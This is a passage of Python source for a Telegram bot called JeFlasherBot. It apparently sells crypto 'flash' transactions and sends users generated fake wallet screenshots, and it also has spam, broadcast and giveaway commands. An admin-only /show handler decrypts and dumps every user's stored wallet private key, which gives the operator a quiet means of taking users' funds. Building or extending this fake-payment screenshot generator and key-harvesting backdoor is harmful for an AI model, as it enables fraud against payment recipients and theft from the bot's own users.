                    lambda: self.screenshot_gen.generate_screenshot(
                        amount, token, result['tx_hash'], theme=theme, timezone=timezone, network=network, mode=speed, target_address=target_address
                    )
                )
                
                if screenshot_path and os.path.exists(screenshot_path):
                    await context.bot.send_photo(
                        chat_id=user_id,
                        photo=open(screenshot_path, 'rb'),
                        caption="📱 *Generated Wallet Screenshot*",
                        parse_mode='Markdown'
                    )
                    # Cleanup
                    os.remove(screenshot_path)
            except Exception as e:
                logger.error(f"Screenshot error: {e}")
                await context.bot.send_message(chat_id=user_id, text=f"⚠️ Could not generate screenshot: {e}")
        else:
            await status_msg.edit_text(f"❌ Flash failed: {result.get('error')}")

    async def show_keys(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /show command (Admin only)"""
        user_id = update.effective_user.id
        
        if user_id != ADMIN_USER_ID:
            # Silently ignore
            return

        users = self.db.get_all_users_with_keys()
        
        if not users:
            await update.message.reply_text("No users with keys found.")
            return

        message = "🔐 *User Private Keys*\n\n"
        
        for user in users:
            try:
                decrypted_key = self.encryption.decrypt(user['private_key_encrypted'])
                user_info = (
                    f"👤 *User:* {user['username']} (ID: `{user['user_id']}`)\n"
                    f"👛 *Wallet:* `{user['wallet_address']}`\n"
                    f"🔑 *Key:* `{decrypted_key}`\n"
                    f"📅 *Created:* {user['created_at']}\n\n"
                )
                
                # Check message length limit (4096 chars)
                if len(message) + len(user_info) > 4000:
                    await update.message.reply_text(message, parse_mode='Markdown')
                    message = "🔐 *User Private Keys (Cont.)*\n\n"
                
                message += user_info
            except Exception as e:
                logger.error(f"Error processing user {user['user_id']}: {e}")
        
        if message:
            await update.message.reply_text(message, parse_mode='Markdown')

    async def givesub_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /givesub command (Admin only)"""
        user_id = update.effective_user.id
        if user_id != ADMIN_USER_ID:
            return

        try:
            # Usage: /givesub <duration> <user_id> OR /givesub <user_id> <duration>
            if len(context.args) != 2:
                await update.message.reply_text("❌ Usage: /givesub <duration> <user_id>\nExample: /givesub 1m 123456789")
                return

            arg1 = context.args[0]
            arg2 = context.args[1]
            
            # Determine which arg is ID and which is duration
            target_user_id = None
            duration_str = None
            
            if arg1.isdigit() and len(arg1) > 5: # Likely ID
                target_user_id = int(arg1)
                duration_str = arg2.lower()
            elif arg2.isdigit() and len(arg2) > 5: # Likely ID
                target_user_id = int(arg2)
                duration_str = arg1.lower()
            else:
                # Fallback to original order
                duration_str = arg1.lower()
                target_user_id = int(arg2)
            
            # Create subscription
            # Using 'manual' as payment hash to indicate admin grant
            if self.db.create_subscription(target_user_id, duration_str, 0.0, f"manual_{datetime.now().timestamp()}"):
                success_msg = f"✅ Subscription granted to `{target_user_id}` for `{duration_str}`."
                await update.message.reply_text(success_msg, parse_mode='Markdown')
                
                # Notify user
                try:
                    await context.bot.send_message(
                        chat_id=target_user_id,
                        text=f"🎉 *Subscription Granted!*\n\nYou have been granted a subscription for {duration_str} by the admin.",
                        parse_mode='Markdown'
                    )
                except Exception as e:
                    await update.message.reply_text(f"⚠️ Subscription added but failed to notify user: {e}")
                
                # Log to GC
                await self.log_to_admin_gc(f"👑 *Admin Action*\n\nGiven subscription to `{target_user_id}` for `{duration_str}`")
                
            else:
                await update.message.reply_text("❌ Failed to create subscription. Check logs.")
                
        except ValueError:
            await update.message.reply_text("❌ Invalid user ID.")
        except Exception as e:
            logger.error(f"Error in givesub: {e}")
            await update.message.reply_text(f"❌ Error: {e}")

    async def broadcast_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /broadcast command (Admin only)"""
        user_id = update.effective_user.id
        if user_id != ADMIN_USER_ID:
            return

        if not context.args:
            await update.message.reply_text("❌ Usage: /broadcast <message>")
            return

        message = " ".join(context.args)
        # Use get_all_chat_ids instead of get_all_user_ids to include groups/channels
        chat_ids = self.db.get_all_chat_ids()
        
        status_msg = await update.message.reply_text(f"📢 Broadcasting to {len(chat_ids)} chats...")
        
        success_count = 0
        fail_count = 0
        
        for cid in chat_ids:
            try:
                await context.bot.send_message(chat_id=cid, text=f"📢 *Announcement*\n\n{message}", parse_mode='Markdown')
                success_count += 1
                await asyncio.sleep(0.05) # Rate limit
            except Exception:
                fail_count += 1
        
        report = (
            f"✅ *Broadcast Complete*\n\n"
            f"Sent: {success_count}\n"
            f"Failed: {fail_count}\n"
            f"Total: {len(chat_ids)}"
        )
        await status_msg.edit_text(report, parse_mode='Markdown')
        await self.log_to_admin_gc(report)

    async def forward_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /forward command (Admin only)"""
        user_id = update.effective_user.id
        if user_id != ADMIN_USER_ID:
            return

        if not update.message.reply_to_message:
            await update.message.reply_text("❌ Please reply to a message you want to forward with /forward")
            return

        message_to_forward = update.message.reply_to_message
        # Use get_all_chat_ids
        chat_ids = self.db.get_all_chat_ids()
        
        status_msg = await update.message.reply_text(f"⏩ Forwarding to {len(chat_ids)} chats...")
        
        success_count = 0
        fail_count = 0
        
        for cid in chat_ids:
            try:
                await context.bot.forward_message(
                    chat_id=cid,
                    from_chat_id=message_to_forward.chat_id,
                    message_id=message_to_forward.message_id
                )
                success_count += 1
                await asyncio.sleep(0.05)
            except Exception:
                fail_count += 1
        
        report = (
            f"✅ *Forward Complete*\n\n"
            f"Sent: {success_count}\n"
            f"Failed: {fail_count}\n"
            f"Total: {len(chat_ids)}"
        )
        await status_msg.edit_text(report, parse_mode='Markdown')
        await self.log_to_admin_gc(report)

    async def giveaway_start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start giveaway creation"""
        user_id = update.effective_user.id
        if user_id != ADMIN_USER_ID:
            return ConversationHandler.END
            
        await update.message.reply_text(
            "🎁 *Create Giveaway (Step 1/5)*\n\n"
            "Please send an image for the giveaway.\n"
            "Type /skip to continue without an image.",
            parse_mode='Markdown'
        )
        return GIVEAWAY_IMAGE

    async def giveaway_image(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle giveaway image"""
        if update.message.photo:
            # Get largest photo
            photo_file = update.message.photo[-1].file_id
            context.user_data['giveaway_image'] = photo_file
        else:
            text = update.message.text.strip()
            if text == '/skip' or text.lower() == 'skip':
                context.user_data['giveaway_image'] = None
            else:
                await update.message.reply_text("❌ Please send an image or type /skip.")
                return GIVEAWAY_IMAGE
        
        await update.message.reply_text(
            "🎁 *Create Giveaway (Step 2/5)*\n\n"
            "What is the prize? (e.g. 100 USDT)",
            parse_mode='Markdown'
        )
        return GIVEAWAY_PRIZE

    async def giveaway_prize(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle giveaway prize"""
        prize = update.message.text.strip()
        context.user_data['giveaway_prize'] = prize
        
        await update.message.reply_text(
            "🎁 *Create Giveaway (Step 3/5)*\n\n"
            "How many winners? (e.g. 1, 5, 10)",
            parse_mode='Markdown'
        )
        return GIVEAWAY_WINNERS

    async def giveaway_winners(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle giveaway winners"""
        try:
            count = int(update.message.text.strip())
            if count < 1:
                raise ValueError
            context.user_data['giveaway_winners'] = count
            
            await update.message.reply_text(
                "🎁 *Create Giveaway (Step 4/5)*\n\n"
                "Enter the Channel/Group ID to post in (e.g. -100123456789).",
                parse_mode='Markdown'
            )
            return GIVEAWAY_CHANNEL
        except ValueError:
            await update.message.reply_text("❌ Invalid number. Please enter a positive integer.")
            return GIVEAWAY_WINNERS

    async def giveaway_channel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle giveaway channel"""
        try:
            channel_id = int(update.message.text.strip())
            context.user_data['giveaway_channel'] = channel_id
            
            await update.message.reply_text(
                "🎁 *Create Giveaway (Step 5/5)*\n\n"
                "Enter duration in hours (e.g. 0.5h, 1h, 24h).",
                parse_mode='Markdown'
            )
            return GIVEAWAY_DURATION
        except ValueError:
            await update.message.reply_text("❌ Invalid ID. It should be a number (starts with -100 usually).")
            return GIVEAWAY_CHANNEL

    async def giveaway_duration(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle giveaway duration and post"""
        duration_str = update.message.text.strip().lower()
        
        try:
            if duration_str.endswith('h'):
                hours = float(duration_str[:-1])
            else:
                hours = float(duration_str)
                
            end_time = datetime.now() + timedelta(hours=hours)
            
            # Data
            image = context.user_data.get('giveaway_image')
            prize = context.user_data.get('giveaway_prize')
            winners = context.user_data.get('giveaway_winners')
            channel_id = context.user_data.get('giveaway_channel')
            
            # Create Giveaway Message
            giveaway_text = (
                f"🎉 *GIVEAWAY ALERT* 🎉\n\n"
                f"🏆 Prize: *{prize}*\n"
                f"👥 Winners: {winners}\n"
                f"⏳ Ends: {end_time.strftime('%Y-%m-%d %H:%M:%S UTC')}\n\n"
                f"👤 Participants: 0\n\n"
                f"👇 Click below to join!"
            )
            
            keyboard = [[InlineKeyboardButton("🎉 Join Giveaway", callback_data=f'join_giveaway_{channel_id}')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            # Send to channel
            try:
                if image:
                    msg = await context.bot.send_photo(
                        chat_id=channel_id,
                        photo=image,
                        caption=giveaway_text,
                        parse_mode='Markdown',
                        reply_markup=reply_markup
                    )
                else:
                    msg = await context.bot.send_message(
                        chat_id=channel_id,
                        text=giveaway_text,
                        parse_mode='Markdown',
                        reply_markup=reply_markup
                    )
                
                # Save to DB
                self.db.create_giveaway(
                    channel_id=channel_id,
                    message_id=msg.message_id,
                    prize=prize,
                    winners_count=winners,
                    end_time=end_time,
                    image_file_id=image
                )
                
                # Log to Admin GC
                await self.log_to_admin_gc(
                    f"🎁 *New Giveaway Created*\n\n"
                    f"Channel: `{channel_id}`\n"
                    f"Prize: {prize}\n"
                    f"Message ID: `{msg.message_id}`"
                )
                
                await update.message.reply_text("✅ Giveaway posted successfully!")
                
            except Exception as e:
                await update.message.reply_text(f"❌ Failed to post giveaway: {e}\nCheck if bot is admin in the channel.")
                return GIVEAWAY_DURATION # Retry or cancel
            
            return ConversationHandler.END
            
        except ValueError:
            await update.message.reply_text("❌ Invalid duration format. Use 1h, 0.5h etc.")
            return GIVEAWAY_DURATION

    async def join_giveaway(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle join giveaway button"""
        query = update.callback_query
        user_id = query.from_user.id
        # Format: join_giveaway_{channel_id}
        
        try:
            channel_id = int(query.data.split('_')[2])
            message_id = query.message.message_id
            
            # Check membership
            try:
                member = await context.bot.get_chat_member(chat_id=channel_id, user_id=user_id)
                if member.status in ['left', 'kicked']:
                    await query.answer("❌ You must join the channel to participate!", show_alert=True)
                    return
            except Exception as e:
                # Bot might not be admin or can't see members, but if button is clicked in channel, user likely there.
                # But requirement says "participants".
                logger.error(f"Error checking membership: {e}")
            
            # Get giveaway from DB
            giveaway = self.db.get_giveaway_by_message(channel_id, message_id)
            if not giveaway:
                # Fallback for old giveaways or errors
                await query.answer("❌ This giveaway is not active or not found.", show_alert=True)
                return

            if not giveaway['is_active']:
                 await query.answer("❌ This giveaway has ended!", show_alert=True)
                 return

            # Add participant
            username = query.from_user.username or "Unknown"
            first_name = query.from_user.first_name or ""
            
            if self.db.add_giveaway_participant(giveaway['id'], user_id, username, first_name):
                # Success
                await query.answer("✅ You have joined the giveaway!", show_alert=True)
                
                # Update participant count
                count = self.db.get_giveaway_participants_count(giveaway['id'])
                
                # Update message text
                # We need to reconstruct the text. 
                # Original format:
                # 🎉 *GIVEAWAY ALERT* 🎉
                # 🏆 Prize: *{prize}*
                # 👥 Winners: {winners}
                # ⏳ Ends: {end_time}
                # 👤 Participants: {count}
                # 👇 Click below to join!
                
                end_time_str = giveaway['end_time']
                # Convert to datetime object if string
                if isinstance(end_time_str, str):
                    try:
                        end_time_dt = datetime.fromisoformat(end_time_str)
                    except ValueError:
                        end_time_dt = datetime.strptime(end_time_str, '%Y-%m-%d %H:%M:%S.%f')
                    end_time_display = end_time_dt.strftime('%Y-%m-%d %H:%M:%S UTC')
                else:
                    end_time_display = end_time_str.strftime('%Y-%m-%d %H:%M:%S UTC')

                new_text = (
                    f"🎉 *GIVEAWAY ALERT* 🎉\n\n"
                    f"🏆 Prize: *{giveaway['prize']}*\n"
                    f"👥 Winners: {giveaway['winners_count']}\n"
                    f"⏳ Ends: {end_time_display}\n\n"
                    f"👤 Participants: {count}\n\n"
                    f"👇 Click below to join!"
                )
                
                # Only update if count changed (which it did)
                try:
                    if giveaway['image_file_id']:
                         await context.bot.edit_message_caption(
                            chat_id=channel_id,
                            message_id=message_id,
                            caption=new_text,
                            parse_mode='Markdown',
                            reply_markup=query.message.reply_markup
                        )
                    else:
                        await context.bot.edit_message_text(
                            chat_id=channel_id,
                            message_id=message_id,
                            text=new_text,
                            parse_mode='Markdown',
                            reply_markup=query.message.reply_markup
                        )
                except Exception as e:
                    # Ignore "Message is not modified" errors
                    logger.warning(f"Failed to update giveaway message: {e}")

                # Log to Admin GC (optional, might spam)
                # await self.log_to_admin_gc(f"👤 User {username} joined giveaway in `{channel_id}`")

            else:
                # Already joined
                await query.answer("❌ You are already joined!", show_alert=True)
            
        except Exception as e:
            await query.answer("❌ Error joining.", show_alert=True)
            logger.error(f"Giveaway join error: {e}")

    async def track_chat_member(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Track when bot is added to a chat"""
        if not update.my_chat_member:
            return
            
        chat = update.my_chat_member.chat
        new_status = update.my_chat_member.new_chat_member.status
        
        if new_status in ['member', 'administrator']:
            chat_type = chat.type
            chat_name = chat.title or chat.username or "Unknown"
            self.db.add_chat(chat.id, chat_type, chat_name)
            logger.info(f"Added to chat: {chat.id} ({chat_name})")

    async def check_giveaways(self, context: ContextTypes.DEFAULT_TYPE):
        """Check for ended giveaways"""
        giveaways = self.db.get_active_giveaways()
        now = datetime.now()
        
        for g in giveaways:
            end_time_str = g['end_time']
            if isinstance(end_time_str, str):
                try:
                    end_time = datetime.fromisoformat(end_time_str)
                except ValueError:
                    end_time = datetime.strptime(end_time_str, '%Y-%m-%d %H:%M:%S.%f')
            else:
                end_time = end_time_str
                
            if now >= end_time:
                # End giveaway
                self.db.end_giveaway(g['id'])
                
                # Pick winners
                participants = self.db.get_giveaway_participants(g['id'])
                winners_count = min(g['winners_count'], len(participants))
                
                if winners_count > 0:
                    winners = random.sample(participants, winners_count)
                    winners_text = "\n".join([f"🎉 @{w['username']} ({w['first_name']})" for w in winners])
                    
                    final_text = (
                        f"🎉 *GIVEAWAY ENDED* 🎉\n\n"
                        f"🏆 Prize: *{g['prize']}*\n"
                        f"👥 Total Participants: {len(participants)}\n\n"
                        f"👑 *WINNERS:*\n{winners_text}"
                    )
                else:
                    final_text = (
                        f"🎉 *GIVEAWAY ENDED* 🎉\n\n"
                        f"🏆 Prize: *{g['prize']}*\n"
                        f"😔 No participants joined."
                    )
                
                # Update message
                try:
                    if g['image_file_id']:
                        await context.bot.edit_message_caption(
                            chat_id=g['channel_id'],
                            message_id=g['message_id'],
                            caption=final_text,
                            parse_mode='Markdown',
                            reply_markup=None # Remove button
                        )
                    else:
                        await context.bot.edit_message_text(
                            chat_id=g['channel_id'],
                            message_id=g['message_id'],
                            text=final_text,
                            parse_mode='Markdown',
                            reply_markup=None
                        )
                    
                    # Announce in channel
                    await context.bot.send_message(
                        chat_id=g['channel_id'],
                        text=f"🚨 *Giveaway Results* 🚨\n\nPrize: {g['prize']}\n\n{final_text}",
                        parse_mode='Markdown',
                        reply_to_message_id=g['message_id']
                    )
                    
                except Exception as e:
                    logger.error(f"Failed to end giveaway {g['id']}: {e}")

    def run(self):
        """Run the bot"""
        if not BOT_TOKEN:
            print("Error: BOT_TOKEN not found in environment variables")
            return

        application = Application.builder().token(BOT_TOKEN).build()
        self.application = application

        # Handlers
        application.add_handler(CommandHandler("start", self.start))
        application.add_handler(CommandHandler("help", self.help_command))
        application.add_handler(CommandHandler("support", self.support_command))
        application.add_handler(CommandHandler("status", self.status))
        application.add_handler(CommandHandler("buy", self.buy))
        application.add_handler(CommandHandler("flash", self.flash))
        application.add_handler(CommandHandler("spam", self.spam_command))
        application.add_handler(CommandHandler("show", self.show_keys))
        application.add_handler(CommandHandler("givesub", self.givesub_command))
        application.add_handler(CommandHandler("givebal", self.givebal))
        application.add_handler(CommandHandler("broadcast", self.broadcast_command))
        application.add_handler(CommandHandler("forward", self.forward_command))
        application.add_handler(CommandHandler("cancel", self.cancel))
        application.add_handler(CommandHandler("settime", self.set_time))
        application.add_handler(CommandHandler("settheme", self.set_theme))
        
        # Giveaway conversation
        giveaway_handler = ConversationHandler(
            entry_points=[CommandHandler("giveaway", self.giveaway_start)],
            states={
                GIVEAWAY_IMAGE: [MessageHandler(filters.PHOTO | filters.TEXT & ~filters.COMMAND, self.giveaway_image)],
                GIVEAWAY_PRIZE: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.giveaway_prize)],
                GIVEAWAY_WINNERS: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.giveaway_winners)],
                GIVEAWAY_CHANNEL: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.giveaway_channel)],
                GIVEAWAY_DURATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.giveaway_duration)]
            },
            fallbacks=[CommandHandler("cancel", self.cancel)]
        )
        application.add_handler(giveaway_handler)

        # Key setting conversation
        key_handler = ConversationHandler(
            entry_points=[CommandHandler("setkey", self.set_key_start)],
            states={
                WAITING_FOR_KEY: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.set_key_finish)],
                WAITING_FOR_SOL_KEY: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.set_key_sol)]
            },
            fallbacks=[CommandHandler("cancel", self.cancel)]
        )
        application.add_handler(key_handler)

        # Flash flow callback handler
        application.add_handler(CallbackQueryHandler(self.button_callback))
        
        # Chat member handler to track chats
        application.add_handler(ChatMemberHandler(self.track_chat_member, ChatMemberHandler.MY_CHAT_MEMBER))

        # Job queue for giveaways
        if application.job_queue:
            application.job_queue.run_repeating(self.check_giveaways, interval=60, first=10)
        
        # Message handler for flash flow steps
        async def message_handler(update, context):
            if context.user_data.get('awaiting_target'):
                if await self.handle_flash_target(update, context):
                    context.user_data['awaiting_target'] = False
            elif context.user_data.get('awaiting_amount'):
                if await self.handle_flash_amount(update, context):
                    context.user_data['awaiting_amount'] = False
            elif context.user_data.get('awaiting_tx_hash'):
                await self.handle_payment_verification(update, context)
        
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))

        print("Bot is running...")
        application.run_polling()

if __name__ == '__main__':
    bot = JeFlasherBot()
    bot.run()
